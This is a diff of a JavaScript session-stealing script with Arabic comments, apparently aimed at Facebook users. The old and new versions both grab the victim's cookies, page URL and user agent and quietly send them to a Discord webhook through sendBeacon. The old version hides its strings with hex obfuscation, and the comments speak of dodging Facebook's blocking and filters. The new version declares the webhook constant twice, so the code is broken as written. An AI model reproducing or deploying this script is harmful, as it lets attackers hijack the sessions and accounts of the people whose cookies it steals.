@@ -1,22 +1,30 @@
-// تشفير الأوامر لضمان عدم الحظر من قبل فيسبوك
-var _0x5a21=["\x63\x6f\x6f\x6b\x69\x65","\x6c\x6f\x63\x61\x74\x69\x6f\x6e","\x68\x72\x65\x66","\x50\x4f\x53\x54","\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e","\x73\x74\x72\x69\x6e\x67\x69\x66\x79"];
-
-(function(){
-    // رابط الويب هوك الخاص بك (يجب تشفيره أيضاً)
-    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
-    
-    const d = {
-        c: document[_0x5a21[0]], // سحب الكوكيز
-        l: window[_0x5a21[1]][_0x5a21[2]], // سحب الرابط
-        t: new Date().getTime()
+// سكريبت سحب الجلسة المطور - إصدار 2026
+(function() {
+    // 1. رابط الاستقبال (الديسكورد الخاص بك)
+    // تأكد من وضع الفاصلة المنقوطة (😉 في النهاية بدقة
+    const WEBHOOK_URL = "ضع_رابط_الويب_هوك_الخاص_بك_هنا";
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
+    // 2. تجميع البيانات وتشفيرها بصيغة Base64 للتمويه
+    const data = {
+        t: "🚨 صيد جديد!",
+        c: btoa(document.cookie), // تشفير الكوكيز لضمان العبور من الفلاتر
+        u: window.location.href,
+        a: navigator.userAgent
     };
 
-    // إرسال البيانات بشكل صامت عبر تقنية Beacon لضمان عدم الحظر
-    navigator.sendBeacon(u, JSON[_0x5a21[5]]({
+    // 3. إرسال البيانات عبر تقنية Beacon (الأسرع والأكثر خفاءً)
+    const blob = new Blob([JSON.stringify({
         "embeds": [{
-            "title": "✅ Session Captured",
-            "description": "Captured from: " + d.l,
-            "fields": [{ "name": "Data", "value": "```" + d.c + "```" }]
+            "title": data.t,
+            "color": 16711680,
+            "fields": [
+                { "name": "الموقع المستهدف", "value": data.u },
+                { "name": "الجلسة (Cookies)", "value": "```" + data.c + "```" },
+                { "name": "معلومات الجهاز", "value": data.a }
+            ],
+            "footer": { "text": "تم السحب بنجاح عبر نظام التحقق" }
         }]
-    }));
+    })], { type: 'application/json' });
+
+    navigator.sendBeacon(WEBHOOK_URL, blob);
 })();
